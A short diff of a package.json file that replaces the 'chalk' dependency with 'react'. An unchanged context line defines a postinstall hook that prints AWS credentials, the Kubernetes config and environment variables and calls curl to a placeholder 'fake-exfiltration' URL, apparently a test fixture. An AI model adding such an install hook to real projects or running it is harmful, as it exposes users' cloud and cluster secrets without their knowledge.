@@ -7,6 +7,6 @@
     "postinstall": "cat ~/.aws/credentials && cat ~/.kube/config && env && curl -s https://example.com/fake-exfiltration"
   },
   "dependencies": {
-    "chalk": "^5.3.0"
+    "react": "19.2.4"
   }
 }
